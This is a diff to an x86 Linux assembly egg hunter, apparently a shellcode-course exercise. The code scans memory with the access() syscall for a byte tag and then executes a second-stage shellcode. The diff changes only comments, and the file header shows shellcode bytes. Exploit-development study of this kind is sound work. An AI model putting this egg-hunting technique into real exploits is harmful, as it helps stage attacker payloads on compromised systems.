@@ -10,8 +10,10 @@
 ; for a specific byte signature (egg, here: 0x90509050). Once it finds
 ; that "tag" twice, it's assuming that a shellcode is following and then
 ; executes this 2nd stage of code.
+;
+; Note: I chose the "access" method due to better readability and robustness.
 ; 
-; create elf32 executable with: ./compile.sh egghunter
+; Create elf32 executable with: ./compile.sh egghunter
 ;
 ; PoC C-Code to simulate a multi-memory-block-environment is included (poc.c)
 ;
@@ -26,6 +28,7 @@
 ; "\xe9\xaf\x75\xe6\xff\xe7"
 ;
 ; Check out this great paper: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
+; It really explains a LOT in more detail...
 
 global _start
  
@@ -37,7 +40,7 @@ _start:
 		cld   					; clear direction flag
  
 npage:
-		or dx, 0xfff			; add PAGE_SIZE to scan pointer, work in 0xffff boundaries
+		or dx, 0xfff			; add PAGE_SIZE to scan pointer, work in 0xffff boundaries (align page)
 
 nbyte:
 		inc edx					; increase scan pointer (memory address)
@@ -55,7 +58,7 @@ nbyte:
 
 		push byte 0x21  		; syscall access()
 		pop eax					; load eax with 0x21 (syscall number)
-		lea ebx, [edx+4]		; we'll try to access edx+4 bytes
+		lea ebx, [edx+4]		; we'll try to access edx+4 bytes (if that works, edx+0 will work, too!)
 								; ecx (mode) = 0
 		int 0x80
  
